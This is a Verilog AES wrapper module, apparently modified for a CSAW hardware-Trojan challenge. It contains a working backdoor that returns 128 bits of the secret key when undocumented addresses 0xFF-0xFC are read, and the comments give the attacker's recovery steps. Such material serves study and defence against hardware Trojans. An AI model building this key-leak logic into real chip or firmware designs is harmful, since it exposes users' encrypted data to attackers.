//======================================================================
//
// aes.v (MODIFIED WITH HARDWARE TROJAN)
// --------
// Top level wrapper for the AES block cipher core.
//
// HARDWARE TROJAN: This file has been modified to include a key leakage
// Trojan. The Trojan allows an attacker to read the secret AES key by
// accessing hidden addresses (0xFF, 0xFE, 0xFD, 0xFC) that are outside
// the normal address range.
//
// HOW IT WORKS:
// - Normal addresses: 0x00-0x33 (for normal AES operations)
// - Hidden addresses: 0xFF-0xFC (for key leakage - TROJAN!)
// - When reading from hidden addresses, the chip returns the secret key
//   in 32-bit chunks instead of normal data
//
// Author: Joachim Strombergson (Original)
// Modified: CSAW Challenge (Added Hardware Trojan)
// Copyright (c) 2013, 2014 Secworks Sweden AB
// All rights reserved.
//
//======================================================================

`default_nettype none

//======================================================================
// MODULE: aes
//======================================================================
// This is the top-level module for the AES encryption chip.
//
// WHAT IT DOES:
// - Provides an interface to read/write AES data
// - Handles encryption/decryption operations
// - Stores the secret key internally
//
// PORTS (Inputs and Outputs):
// - clk: Clock signal (synchronizes all operations)
// - reset_n: Reset signal (active low - when 0, chip resets)
// - cs: Chip select (when 1, chip is active)
// - we: Write enable (when 1, writing data; when 0, reading data)
// - address: Which register to access (0x00-0x33 for normal, 0xFF-0xFC for Trojan)
// - write_data: Data to write (32 bits)
// - read_data: Data to read (32 bits)
//======================================================================
module aes(
           // Clock and reset signals
           // These are fundamental signals in digital circuits
           // - clk: Like a heartbeat - everything happens on clock edges
           // - reset_n: When low (0), resets all registers to zero
           input wire           clk,
           input wire           reset_n,

           // Control signals
           // - cs: Chip Select - enables the chip (like turning it on)
           // - we: Write Enable - 1 = write, 0 = read
           input wire           cs,
           input wire           we,

           // Data ports
           // - address: Which register to access (8 bits = 256 possible addresses)
           // - write_data: Data to write (32 bits = 4 bytes)
           // - read_data: Data to read (32 bits = 4 bytes)
           input wire  [7 : 0]  address,
           input wire  [31 : 0] write_data,
           output wire [31 : 0] read_data
          );

  //====================================================================
  // ADDRESS DEFINITIONS
  //====================================================================
  // These are like "room numbers" - each address points to a different
  // register (memory location) in the chip.
  //
  // NORMAL ADDRESSES (0x00-0x33):
  // - These are documented and used for normal operations
  // - Anyone using the chip knows about these
  //
  // HIDDEN ADDRESSES (0xFF-0xFC) - TROJAN!
  // - These are NOT documented
  // - These are the Trojan addresses
  // - When you read from these, you get the secret key!
  //====================================================================
  
  // Normal addresses for chip identification
  localparam ADDR_NAME0       = 8'h00;  // Chip name, first word
  localparam ADDR_NAME1       = 8'h01;  // Chip name, second word
  localparam ADDR_VERSION     = 8'h02;  // Chip version number

  // Control and status addresses
  localparam ADDR_CTRL        = 8'h08;  // Control register (start encryption, etc.)
  localparam CTRL_INIT_BIT    = 0;      // Bit 0: Initialize operation
  localparam CTRL_NEXT_BIT    = 1;      // Bit 1: Start next operation

  localparam ADDR_STATUS      = 8'h09;  // Status register (ready, valid flags)
  localparam STATUS_READY_BIT = 0;      // Bit 0: Chip is ready
  localparam STATUS_VALID_BIT = 1;      // Bit 1: Result is valid

  localparam ADDR_CONFIG      = 8'h0a;  // Configuration register
  localparam CTRL_ENCDEC_BIT  = 0;      // Bit 0: 0=encrypt, 1=decrypt
  localparam CTRL_KEYLEN_BIT  = 1;      // Bit 1: Key length (128 or 256 bits)

  // Key storage addresses (normal - for writing the key)
  localparam ADDR_KEY0        = 8'h10;  // Key word 0 (first 32 bits)
  localparam ADDR_KEY7        = 8'h17;  // Key word 7 (last 32 bits for 256-bit keys)

  // Data block addresses (normal - for writing data to encrypt)
  localparam ADDR_BLOCK0      = 8'h20;  // Data block word 0
  localparam ADDR_BLOCK3      = 8'h23;  // Data block word 3

  // Result addresses (normal - for reading encrypted/decrypted data)
  localparam ADDR_RESULT0     = 8'h30;  // Result word 0
  localparam ADDR_RESULT3     = 8'h33;  // Result word 3

  // Chip identification constants
  localparam CORE_NAME0       = 32'h61657320; // "aes " in ASCII
  localparam CORE_NAME1       = 32'h20202020; // "    " in ASCII (spaces)
  localparam CORE_VERSION     = 32'h302e3630; // "0.60" in ASCII

  //====================================================================
  // HARDWARE TROJAN: HIDDEN ADDRESSES FOR KEY LEAKAGE
  //====================================================================
  // These addresses are OUTSIDE the normal range (0x00-0x33)
  // They are NOT documented in the chip manual
  // When you read from these addresses, you get the SECRET KEY!
  //
  // HOW IT WORKS:
  // - Address 0xFF returns key_reg[0] (first 32 bits of key)
  // - Address 0xFE returns key_reg[1] (second 32 bits of key)
  // - Address 0xFD returns key_reg[2] (third 32 bits of key)
  // - Address 0xFC returns key_reg[3] (fourth 32 bits of key)
  //
  // For a 128-bit key, you need all 4 words (0xFF, 0xFE, 0xFD, 0xFC)
  // For a 256-bit key, you'd need 8 words (but we only leak 128 bits here)
  //
  // WHY THIS IS DANGEROUS:
  // - The secret key should NEVER be readable!
  // - An attacker can read these hidden addresses
  // - They can recover the complete secret key
  // - With the key, they can decrypt all encrypted data!
  //====================================================================
  localparam ADDR_KEY_LEAK    = 8'hFF; // HIDDEN: Returns key_reg[0] (first 32 bits)
  localparam ADDR_KEY_LEAK1   = 8'hFE; // HIDDEN: Returns key_reg[1] (second 32 bits)
  localparam ADDR_KEY_LEAK2   = 8'hFD; // HIDDEN: Returns key_reg[2] (third 32 bits)
  localparam ADDR_KEY_LEAK3   = 8'hFC; // HIDDEN: Returns key_reg[3] (fourth 32 bits)


  //====================================================================
  // REGISTERS (Internal Memory)
  //====================================================================
  // Registers are like variables in software - they store values
  // In hardware, registers are made of flip-flops (memory elements)
  //
  // These registers store:
  // - Control signals (init, next)
  // - Configuration (encdec, keylen)
  // - Data (block, key, result)
  // - Status (ready, valid)
  //====================================================================
  
  // Control registers
  reg init_reg;      // Initialize operation flag
  reg init_new;      // New value for init_reg (will be stored on next clock)

  reg next_reg;      // Start next operation flag
  reg next_new;      // New value for next_reg

  // Configuration registers
  reg encdec_reg;    // 0 = encrypt, 1 = decrypt
  reg keylen_reg;    // 0 = 128-bit key, 1 = 256-bit key
  reg config_we;     // Write enable for configuration

  // Data block registers (stores data to encrypt/decrypt)
  // This is an array of 4 registers, each 32 bits wide
  // block_reg[0] = first 32 bits of data block
  // block_reg[1] = second 32 bits of data block
  // block_reg[2] = third 32 bits of data block
  // block_reg[3] = fourth 32 bits of data block
  // Total: 128 bits (16 bytes) - one AES block
  reg [31 : 0] block_reg [0 : 3];
  reg          block_we;  // Write enable for block registers

  // KEY REGISTERS - THIS IS WHERE THE SECRET KEY IS STORED!
  // This is an array of 8 registers, each 32 bits wide
  // key_reg[0] = first 32 bits of key
  // key_reg[1] = second 32 bits of key
  // key_reg[2] = third 32 bits of key
  // key_reg[3] = fourth 32 bits of key
  // key_reg[4-7] = additional key bits for 256-bit keys
  // Total: Up to 256 bits (32 bytes) of secret key
  //
  // IMPORTANT: This key should NEVER be readable!
  // But our Trojan makes it readable through hidden addresses!
  reg [31 : 0] key_reg [0 : 7];
  reg          key_we;  // Write enable for key registers

  // Result registers (stores encrypted/decrypted data)
  reg [127 : 0] result_reg;  // 128-bit result (one AES block)
  reg           valid_reg;   // 1 = result is valid, 0 = result is invalid
  reg           ready_reg;   // 1 = chip is ready, 0 = chip is busy


  //====================================================================
  // WIRES (Connections Between Modules)
  //====================================================================
  // Wires are like cables - they connect different parts of the circuit
  // Unlike registers, wires don't store values - they just pass signals
  //====================================================================
  
  reg [31 : 0]   tmp_read_data;  // Temporary storage for read data

  // Wires connecting to the AES core module
  wire           core_encdec;     // Encrypt/decrypt signal to core
  wire           core_init;       // Initialize signal to core
  wire           core_next;       // Next operation signal to core
  wire           core_ready;      // Ready signal from core
  wire [255 : 0] core_key;        // Key to core (up to 256 bits)
  wire           core_keylen;     // Key length to core
  wire [127 : 0] core_block;      // Data block to core
  wire [127 : 0] core_result;    // Result from core
  wire           core_valid;      // Valid signal from core


  //====================================================================
  // CONCURRENT ASSIGNMENTS (Combinational Logic)
  //====================================================================
  // These assignments happen "immediately" - no clock needed
  // They're like formulas that are always true
  //====================================================================
  
  // Connect read_data output to our temporary read data
  assign read_data = tmp_read_data;

  // Concatenate key registers into one 256-bit wire
  // This takes 8 separate 32-bit values and combines them into one 256-bit value
  // {a, b, c} means: concatenate a, b, c (a is most significant)
  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};

  // Concatenate block registers into one 128-bit wire
  assign core_block  = {block_reg[0], block_reg[1],
                        block_reg[2], block_reg[3]};
  
  // Connect control signals to core
  assign core_init   = init_reg;
  assign core_next   = next_reg;
  assign core_encdec = encdec_reg;
  assign core_keylen = keylen_reg;


  //====================================================================
  // AES CORE INSTANTIATION
  //====================================================================
  // This creates an instance of the AES core module
  // Think of it like calling a function, but in hardware
  // The core does the actual encryption/decryption
  //====================================================================
  aes_core core(
                .clk(clk),
                .reset_n(reset_n),

                .encdec(core_encdec),
                .init(core_init),
                .next(core_next),
                .ready(core_ready),

                .key(core_key),
                .keylen(core_keylen),

                .block(core_block),
                .result(core_result),
                .result_valid(core_valid)
               );


  //====================================================================
  // REGISTER UPDATE (Sequential Logic)
  //====================================================================
  // This block updates all registers on every clock edge
  // It's like a function that runs every clock cycle
  //
  // HOW IT WORKS:
  // - On reset (reset_n = 0): Set everything to zero
  // - On clock edge (posedge clk): Update registers with new values
  //====================================================================
  always @ (posedge clk or negedge reset_n)
    begin : reg_update
      integer i;  // Loop variable

      // RESET: When reset_n is low (0), reset everything to zero
      if (!reset_n)
        begin
          // Reset all block registers to zero
          for (i = 0 ; i < 4 ; i = i + 1)
            block_reg[i] <= 32'h0;

          // Reset all key registers to zero
          for (i = 0 ; i < 8 ; i = i + 1)
            key_reg[i] <= 32'h0;

          // Reset control registers
          init_reg   <= 1'b0;
          next_reg   <= 1'b0;
          encdec_reg <= 1'b0;
          keylen_reg <= 1'b0;

          // Reset result registers
          result_reg <= 128'h0;
          valid_reg  <= 1'b0;
          ready_reg  <= 1'b0;
        end
      else
        begin
          // NORMAL OPERATION: Update registers on clock edge
          
          // Update status from core
          ready_reg  <= core_ready;   // Copy ready signal from core
          valid_reg  <= core_valid;   // Copy valid signal from core
          result_reg <= core_result;  // Copy result from core
          
          // Update control registers
          init_reg   <= init_new;      // Update init flag
          next_reg   <= next_new;      // Update next flag

          // Update configuration if write enable is set
          if (config_we)
            begin
              encdec_reg <= write_data[CTRL_ENCDEC_BIT];  // Set encrypt/decrypt
              keylen_reg <= write_data[CTRL_KEYLEN_BIT];  // Set key length
            end

          // Update key register if write enable is set
          // address[2:0] gives us which key word (0-7)
          if (key_we)
            key_reg[address[2 : 0]] <= write_data;

          // Update block register if write enable is set
          // address[1:0] gives us which block word (0-3)
          if (block_we)
            block_reg[address[1 : 0]] <= write_data;
        end
    end // reg_update


  //====================================================================
  // ADDRESS DECODER / API (Combinational Logic)
  //====================================================================
  // This block decodes addresses and handles read/write operations
  // It's like a switch statement that decides what to do based on address
  //
  // HOW IT WORKS:
  // - If cs (chip select) is high, the chip is active
  // - If we (write enable) is high, we're writing data
  // - If we is low, we're reading data
  // - The address tells us which register to access
  //
  // THIS IS WHERE THE TROJAN IS INSERTED!
  // When reading from hidden addresses (0xFF-0xFC), we return the key!
  //====================================================================
  always @*
    begin : api
      // Default values (assume nothing happens)
      init_new      = 1'b0;      // Don't initialize
      next_new      = 1'b0;      // Don't start next operation
      config_we     = 1'b0;      // Don't write configuration
      key_we        = 1'b0;      // Don't write key
      block_we      = 1'b0;      // Don't write block
      tmp_read_data = 32'h0;     // Read zero by default

      // Only do something if chip is selected (cs = 1)
      if (cs)
        begin
          // WRITE OPERATION (we = 1)
          if (we)
            begin
              // Write to control register
              if (address == ADDR_CTRL)
                begin
                  init_new = write_data[CTRL_INIT_BIT];  // Set init flag
                  next_new = write_data[CTRL_NEXT_BIT];  // Set next flag
                end

              // Write to configuration register
              if (address == ADDR_CONFIG)
                config_we = 1'b1;  // Enable configuration write

              // Write to key registers (addresses 0x10-0x17)
              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
                key_we = 1'b1;  // Enable key write

              // Write to block registers (addresses 0x20-0x23)
              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
                block_we = 1'b1;  // Enable block write
            end // if (we)

          // READ OPERATION (we = 0)
          else
            begin
              // Decode address to determine what to read
              case (address)
                // Normal addresses - return chip information
                ADDR_NAME0:   tmp_read_data = CORE_NAME0;   // Return "aes "
                ADDR_NAME1:   tmp_read_data = CORE_NAME1;   // Return "    "
                ADDR_VERSION: tmp_read_data = CORE_VERSION; // Return "0.60"
                
                // Control register - return current control state
                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
                
                // Status register - return current status
                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};

                // Default case - do nothing (return zero)
                default:
                  begin
                  end
              endcase // case (address)

              // Read result registers (addresses 0x30-0x33)
              // This returns the encrypted/decrypted data
              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];
              
              //================================================================
              // HARDWARE TROJAN: KEY LEAKAGE THROUGH HIDDEN ADDRESSES
              //================================================================
              // THIS IS THE TROJAN CODE!
              // When reading from hidden addresses (0xFF-0xFC), we return the
              // SECRET KEY instead of normal data!
              //
              // HOW IT WORKS:
              // - Check if address matches one of our hidden addresses
              // - If it does, return the corresponding key register
              // - This allows an attacker to read the complete secret key
              //
              // WHY THIS IS DANGEROUS:
              // - The key should NEVER be readable!
              // - An attacker can read these addresses
              // - They can recover the complete 128-bit key
              // - With the key, they can decrypt all encrypted data!
              //
              // HOW AN ATTACKER WOULD USE THIS:
              // 1. Read address 0xFF → Get key_reg[0] (first 32 bits)
              // 2. Read address 0xFE → Get key_reg[1] (second 32 bits)
              // 3. Read address 0xFD → Get key_reg[2] (third 32 bits)
              // 4. Read address 0xFC → Get key_reg[3] (fourth 32 bits)
              // 5. Combine all 4 words → Complete 128-bit secret key!
              //================================================================
              
              // Check if address is our first hidden address (0xFF)
              if (address == ADDR_KEY_LEAK)
                tmp_read_data = key_reg[0];  // LEAK: Return first 32 bits of key
              
              // Check if address is our second hidden address (0xFE)
              else if (address == ADDR_KEY_LEAK1)
                tmp_read_data = key_reg[1];  // LEAK: Return second 32 bits of key
              
              // Check if address is our third hidden address (0xFD)
              else if (address == ADDR_KEY_LEAK2)
                tmp_read_data = key_reg[2];  // LEAK: Return third 32 bits of key
              
              // Check if address is our fourth hidden address (0xFC)
              else if (address == ADDR_KEY_LEAK3)
                tmp_read_data = key_reg[3];  // LEAK: Return fourth 32 bits of key
              
              // Note: The "else if" chain ensures only one address matches
              // If none match, tmp_read_data stays at its default value (0)
            end
        end
    end // api
endmodule // aes

//======================================================================
// END OF MODULE
//======================================================================
// This is the end of the aes module.
//
// SUMMARY:
// - Normal operation: Works exactly like the original AES chip
// - Trojan operation: Allows reading secret key via hidden addresses
// - The Trojan is stealthy: Normal users don't know about hidden addresses
// - The Trojan is dangerous: Allows complete key recovery
//======================================================================

